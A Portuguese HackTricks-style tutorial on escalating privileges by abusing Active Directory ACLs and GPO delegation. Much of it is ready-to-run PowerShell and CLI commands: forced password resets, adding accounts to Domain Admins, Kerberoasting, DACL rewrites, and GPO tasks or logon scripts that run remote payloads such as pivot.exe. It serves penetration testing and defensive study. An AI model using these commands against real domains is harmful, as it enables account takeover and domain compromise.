# Abusando de ACLs/ACEs do Active Directory

{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** 💬 [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositórios do github.

</details>
{% endhint %}

**Esta página é principalmente um resumo das técnicas de** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **e** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. Para mais detalhes, confira os artigos originais.**

## **Direitos GenericAll em Usuário**

Este privilégio concede a um atacante controle total sobre uma conta de usuário alvo. Uma vez que os direitos `GenericAll` são confirmados usando o comando `Get-ObjectAcl`, um atacante pode:

* **Alterar a Senha do Alvo**: Usando `net user <username> <password> /domain`, o atacante pode redefinir a senha do usuário.
* **Kerberoasting Direcionado**: Atribuir um SPN à conta do usuário para torná-la kerberoastable, em seguida, usar Rubeus e targetedKerberoast.py para extrair e tentar quebrar os hashes do ticket-granting ticket (TGT).
```powershell
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
* **ASREPRoasting direcionado**: Desative a pré-autenticação para o usuário, tornando sua conta vulnerável ao ASREPRoasting.
```powershell
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
## **Direitos GenericAll em Grupo**

Esse privilégio permite que um atacante manipule as associações de grupo se tiver direitos `GenericAll` em um grupo como `Domain Admins`. Após identificar o nome distinto do grupo com `Get-NetGroup`, o atacante pode:

* **Adicionar-se ao Grupo de Administradores do Domínio**: Isso pode ser feito por meio de comandos diretos ou usando módulos como Active Directory ou PowerSploit.
```powershell
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
## **GenericAll / GenericWrite / Write on Computer/User**

Ter esses privilégios em um objeto de computador ou em uma conta de usuário permite:

* **Kerberos Resource-based Constrained Delegation**: Permite assumir o controle de um objeto de computador.
* **Shadow Credentials**: Use esta técnica para se passar por uma conta de computador ou usuário explorando os privilégios para criar credenciais sombra.

## **WriteProperty on Group**

Se um usuário tiver direitos `WriteProperty` em todos os objetos de um grupo específico (por exemplo, `Domain Admins`), ele pode:

* **Adicionar-se ao Grupo Domain Admins**: Atingível através da combinação dos comandos `net user` e `Add-NetGroupUser`, este método permite a escalada de privilégios dentro do domínio.
```powershell
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **Self (Auto-Membresia) em Grupo**

Este privilégio permite que atacantes se adicionem a grupos específicos, como `Domain Admins`, através de comandos que manipulam a membresia de grupos diretamente. Usar a seguinte sequência de comandos permite a auto-adição:
```powershell
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty (Auto-Membresia)**

Um privilégio semelhante, isso permite que atacantes se adicionem diretamente a grupos modificando as propriedades do grupo se tiverem o direito de `WriteProperty` nesses grupos. A confirmação e execução desse privilégio são realizadas com:
```powershell
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**

Ter o `ExtendedRight` em um usuário para `User-Force-Change-Password` permite redefinições de senha sem conhecer a senha atual. A verificação desse direito e sua exploração podem ser feitas através do PowerShell ou ferramentas de linha de comando alternativas, oferecendo vários métodos para redefinir a senha de um usuário, incluindo sessões interativas e one-liners para ambientes não interativos. Os comandos variam desde invocações simples do PowerShell até o uso de `rpcclient` no Linux, demonstrando a versatilidade dos vetores de ataque.
```powershell
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **WriteOwner em Grupo**

Se um atacante descobrir que possui direitos de `WriteOwner` sobre um grupo, ele pode mudar a propriedade do grupo para si mesmo. Isso é particularmente impactante quando o grupo em questão é `Domain Admins`, pois mudar a propriedade permite um controle mais amplo sobre os atributos e a membresia do grupo. O processo envolve identificar o objeto correto via `Get-ObjectAcl` e, em seguida, usar `Set-DomainObjectOwner` para modificar o proprietário, seja por SID ou nome.
```powershell
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **GenericWrite em Usuário**

Esta permissão permite que um atacante modifique as propriedades do usuário. Especificamente, com acesso `GenericWrite`, o atacante pode alterar o caminho do script de logon de um usuário para executar um script malicioso durante o logon do usuário. Isso é alcançado usando o comando `Set-ADObject` para atualizar a propriedade `scriptpath` do usuário alvo para apontar para o script do atacante.
```powershell
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **GenericWrite em Grupo**

Com esse privilégio, os atacantes podem manipular a associação a grupos, como adicionar a si mesmos ou a outros usuários a grupos específicos. Esse processo envolve a criação de um objeto de credencial, usando-o para adicionar ou remover usuários de um grupo e verificando as alterações de associação com comandos do PowerShell.
```powershell
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
## **WriteDACL + WriteOwner**

Possuir um objeto AD e ter privilégios de `WriteDACL` sobre ele permite que um atacante se conceda privilégios de `GenericAll` sobre o objeto. Isso é realizado através da manipulação do ADSI, permitindo controle total sobre o objeto e a capacidade de modificar suas associações de grupo. Apesar disso, existem limitações ao tentar explorar esses privilégios usando os cmdlets `Set-Acl` / `Get-Acl` do módulo do Active Directory.
```powershell
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
## **Replicação no Domínio (DCSync)**

O ataque DCSync aproveita permissões específicas de replicação no domínio para imitar um Controlador de Domínio e sincronizar dados, incluindo credenciais de usuário. Essa técnica poderosa requer permissões como `DS-Replication-Get-Changes`, permitindo que atacantes extraiam informações sensíveis do ambiente AD sem acesso direto a um Controlador de Domínio. [**Saiba mais sobre o ataque DCSync aqui.**](../dcsync.md)

## Delegação de GPO <a href="#gpo-delegation" id="gpo-delegation"></a>

### Delegação de GPO

O acesso delegado para gerenciar Objetos de Política de Grupo (GPOs) pode apresentar riscos significativos à segurança. Por exemplo, se um usuário como `offense\spotless` tiver direitos de gerenciamento de GPO, ele pode ter privilégios como **WriteProperty**, **WriteDacl** e **WriteOwner**. Essas permissões podem ser abusadas para fins maliciosos, conforme identificado usando PowerView: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

### Enumerar Permissões de GPO

Para identificar GPOs mal configurados, os cmdlets do PowerSploit podem ser encadeados. Isso permite a descoberta de GPOs que um usuário específico tem permissões para gerenciar: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**Computadores com uma Política Dada Aplicada**: É possível resolver quais computadores uma GPO específica se aplica, ajudando a entender o escopo do impacto potencial. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**Políticas Aplicadas a um Computador Dado**: Para ver quais políticas são aplicadas a um computador específico, comandos como `Get-DomainGPO` podem ser utilizados.

**OUs com uma Política Dada Aplicada**: Identificar unidades organizacionais (OUs) afetadas por uma política dada pode ser feito usando `Get-DomainOU`.

### Abusar GPO - New-GPOImmediateTask

GPOs mal configurados podem ser explorados para executar código, por exemplo, criando uma tarefa agendada imediata. Isso pode ser feito para adicionar um usuário ao grupo de administradores locais em máquinas afetadas, elevando significativamente os privilégios:
```powershell
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### GroupPolicy module - Abuse GPO

O módulo GroupPolicy, se instalado, permite a criação e vinculação de novas GPOs, e a configuração de preferências como valores de registro para executar backdoors em computadores afetados. Este método requer que a GPO seja atualizada e que um usuário faça login no computador para execução:
```powershell
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - Abuso de GPO

SharpGPOAbuse oferece um método para abusar de GPOs existentes adicionando tarefas ou modificando configurações sem a necessidade de criar novas GPOs. Esta ferramenta requer a modificação de GPOs existentes ou o uso de ferramentas RSAT para criar novas antes de aplicar as alterações:
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### Forçar Atualização de Política

Atualizações de GPO normalmente ocorrem a cada 90 minutos. Para acelerar esse processo, especialmente após implementar uma mudança, o comando `gpupdate /force` pode ser usado no computador alvo para forçar uma atualização imediata da política. Este comando garante que quaisquer modificações nas GPOs sejam aplicadas sem esperar pelo próximo ciclo automático de atualização.

### Nos Bastidores

Ao inspecionar as Tarefas Agendadas para uma determinada GPO, como a `Política Mal Configurada`, a adição de tarefas como `evilTask` pode ser confirmada. Essas tarefas são criadas por meio de scripts ou ferramentas de linha de comando com o objetivo de modificar o comportamento do sistema ou escalar privilégios.

A estrutura da tarefa, conforme mostrado no arquivo de configuração XML gerado pelo `New-GPOImmediateTask`, descreve os detalhes da tarefa agendada - incluindo o comando a ser executado e seus gatilhos. Este arquivo representa como as tarefas agendadas são definidas e gerenciadas dentro das GPOs, fornecendo um método para executar comandos ou scripts arbitrários como parte da aplicação da política.

### Usuários e Grupos

As GPOs também permitem a manipulação de membros de usuários e grupos nos sistemas alvo. Ao editar os arquivos de política de Usuários e Grupos diretamente, os atacantes podem adicionar usuários a grupos privilegiados, como o grupo local `administrators`. Isso é possível por meio da delegação de permissões de gerenciamento de GPO, que permite a modificação dos arquivos de política para incluir novos usuários ou alterar as associações de grupos.

O arquivo de configuração XML para Usuários e Grupos descreve como essas mudanças são implementadas. Ao adicionar entradas a este arquivo, usuários específicos podem receber privilégios elevados em sistemas afetados. Este método oferece uma abordagem direta para a escalada de privilégios por meio da manipulação de GPO.

Além disso, métodos adicionais para executar código ou manter persistência, como aproveitar scripts de logon/logoff, modificar chaves de registro para autoruns, instalar software via arquivos .msi ou editar configurações de serviços, também podem ser considerados. Essas técnicas fornecem várias maneiras de manter o acesso e controlar sistemas alvo por meio do abuso de GPOs.

## Referências

* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
* [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
* [https://wald0.com/?p=112](https://wald0.com/?p=112)
* [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
* [https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
* [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
* [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System\_DirectoryServices\_ActiveDirectoryAccessRule\_\_ctor\_System\_Security\_Principal\_IdentityReference\_System\_DirectoryServices\_ActiveDirectoryRights\_System\_Security\_AccessControl\_AccessControlType\_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System\_DirectoryServices\_ActiveDirectoryAccessRule\_\_ctor\_System\_Security\_Principal\_IdentityReference\_System\_DirectoryServices\_ActiveDirectoryRights\_System\_Security\_AccessControl\_AccessControlType\_)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
